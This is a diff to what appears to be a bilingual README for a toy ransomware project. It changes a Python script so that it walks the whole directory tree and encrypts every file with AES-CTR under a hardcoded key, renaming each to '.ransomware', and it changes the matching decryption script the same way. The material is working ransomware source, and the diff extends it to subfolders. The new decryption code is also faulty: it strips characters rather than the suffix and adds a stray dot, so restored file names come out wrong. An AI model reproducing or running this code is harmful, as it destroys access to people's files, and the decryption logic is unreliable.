@@ -16,20 +16,23 @@
 import os
 import pyaes
 
-for name in os.listdir("./"):
-    if name != "decrypt.py" and name != "encrypt.py":
-        with open(name, "rb") as file:
-            file_data = file.read()
+for root, dir, files in os.walk("./"):
+    for f in files:
+        if f != "decrypt.py" and f != "encrypt.py" and f.split(".")[-1] != "ransomware":
+            name = os.path.join(root, f)
 
-        key = b"secretencryptkey"
-        aes = pyaes.AESModeOfOperationCTR(key)
+            with open(name, "rb") as file:
+                file_data = file.read()
 
-        data_encrypt = aes.encrypt(file_data)
+            key = b"secretencryptkey"
+            aes = pyaes.AESModeOfOperationCTR(key)
 
-        with open(name, "wb") as file:
-            file.write(data_encrypt)
+            data_encrypt = aes.encrypt(file_data)
 
-        os.rename("./{}".format(name), "./{}.ransomware".format(name))
+            with open(name, "wb") as file:
+                file.write(data_encrypt)
+
+            os.rename(name, f"{name}.ransomware")
 ```
 
 - A chave de criptografia utilizada foi "secretencryptkey", essa chave será utilizada futuramente durante a descriptografia.
@@ -49,10 +52,13 @@ import pyaes
 secret = input("What the secret key?")
 
 if secret == "secretencryptkey":
-    for name in os.listdir("./"):
-        if name != "decrypt.py" and name != "encrypt.py" and name.split(".")[-1] == "ransomware":
-            with open(name, "rb") as file:
-                file_data = file.read()
+    for root, dir, files in os.walk("./"):
+        for f in files:
+            if f != "decrypt.py" and f != "encrypt.py" and f.split(".")[-1] == "ransomware":
+                name = os.path.join(root, f)
+                
+                with open(name, "rb") as file:
+                    file_data = file.read()
 
                 key = secret.encode()
                 aes = pyaes.AESModeOfOperationCTR(key)
@@ -62,9 +68,8 @@ if secret == "secretencryptkey":
                 with open(name, "wb") as file:
                     file.write(data_decrypt)
 
-                list = name.split(".")
-                new_name = "{}.{}".format(list[0],list[1])
-                os.rename("./{}".format(name), "./{}".format(new_name))
+                new_name = name.strip(".ransomware")
+                os.rename(name, f".{new_name}")
 else:
     print("Wrong Decrypt Key!")
 ```
@@ -97,20 +102,23 @@ else:
 import os
 import pyaes
 
-for name in os.listdir("./"):
-    if name != "decrypt.py" and name != "encrypt.py":
-        with open(name, "rb") as file:
-            file_data = file.read()
+for root, dir, files in os.walk("./"):
+    for f in files:
+        if f != "decrypt.py" and f != "encrypt.py" and f.split(".")[-1] != "ransomware":
+            name = os.path.join(root, f)
 
-        key = b"secretencryptkey"
-        aes = pyaes.AESModeOfOperationCTR(key)
+            with open(name, "rb") as file:
+                file_data = file.read()
 
-        data_encrypt = aes.encrypt(file_data)
+            key = b"secretencryptkey"
+            aes = pyaes.AESModeOfOperationCTR(key)
 
-        with open(name, "wb") as file:
-            file.write(data_encrypt)
+            data_encrypt = aes.encrypt(file_data)
 
-        os.rename("./{}".format(name), "./{}.ransomware".format(name))
+            with open(name, "wb") as file:
+                file.write(data_encrypt)
+
+            os.rename(name, f"{name}.ransomware")
 ```
 
 - The encryption key used was "secretencryptkey", this key will be used later during decryption.
@@ -130,10 +138,13 @@ import pyaes
 secret = input("What the secret key?")
 
 if secret == "secretencryptkey":
-    for name in os.listdir("./"):
-        if name != "decrypt.py" and name != "encrypt.py" and name.split(".")[-1] == "ransomware":
-            with open(name, "rb") as file:
-                file_data = file.read()
+    for root, dir, files in os.walk("./"):
+        for f in files:
+            if f != "decrypt.py" and f != "encrypt.py" and f.split(".")[-1] == "ransomware":
+                name = os.path.join(root, f)
+                
+                with open(name, "rb") as file:
+                    file_data = file.read()
 
                 key = secret.encode()
                 aes = pyaes.AESModeOfOperationCTR(key)
@@ -143,9 +154,8 @@ if secret == "secretencryptkey":
                 with open(name, "wb") as file:
                     file.write(data_decrypt)
 
-                list = name.split(".")
-                new_name = "{}.{}".format(list[0],list[1])
-                os.rename("./{}".format(name), "./{}".format(new_name))
+                new_name = name.strip(".ransomware")
+                os.rename(name, f".{new_name}")
 else:
     print("Wrong Decrypt Key!")
 ```
